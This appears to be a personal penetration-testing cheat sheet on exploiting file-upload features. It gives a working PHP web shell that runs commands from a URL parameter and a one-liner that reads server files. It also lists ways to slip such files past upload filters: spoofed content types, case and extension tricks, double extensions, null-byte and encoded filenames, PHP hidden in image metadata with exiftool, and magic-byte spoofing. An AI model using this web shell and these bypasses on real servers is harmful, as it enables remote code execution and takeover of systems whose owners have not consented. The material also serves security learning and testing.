
- you can upload PHP files to get RCE (Remote Code Execution) or a Web Shell

```php
<?php echo file_get_contents('/dir/dir/file'); ?>
<?php echo system($_GET['command']); ?>

```


# Bypass filter
```python
- Upload php file then change the Content-Type to image/jpeg or image/png
- use different case - file.pHp
- use extensions such as php5, shtml
- In Apache, a php file might be executed using the double extension technique such as “file.php.jpg” when “.jpg” is allowed.
- use different encoding techniques (null byte, singe and double url encode):
	%2E = .
	%25, %32, %65 = %, 2, 3
	%00 = null byte

	- shell%2E.php
	- shell%25%32%65.php
	- shell.php%00.jpg
	- shell.phpl.jpg



```

![[Pasted image 20221124192425.png]]




# chain attack
```python
- if the application is not validated to restrict executable file upload but restricts the execution of it in specific directory but have a path traversal vulnerability on upload. Upload the executable file (php, etc.) to a different location. Remember to use different encoding techniques to bypass filter.

-
```


# Tools

### Exiftool
```python
- this tool is used to reading, writing, and manipulating image, video, and pdf metadata.
- can be used to insert php code on an image

example:
>> exiftool --comment="shell code here" <filename>

>> exiftool -DocumentName="shell code here" <filename>

```


# Single Character to null
```python
In burpsuite repeater request section, you can see different formats of like raw and hex, if you want to try the null byte attack, you can insert to the filename like this: myfile.php%00.jpg. Or you insert first like this myfile.phpA.jpg then go to hex then change the value of the character "A" to 00 as null. It will show the name "myfile.php.jpg" but with a null byte without having to type %00.
```


# Magic Bytes
```python
Some server look only the first few bytes to determine the content of a file but that vulnerability you can insert malicious code on it even on jpg.
```


































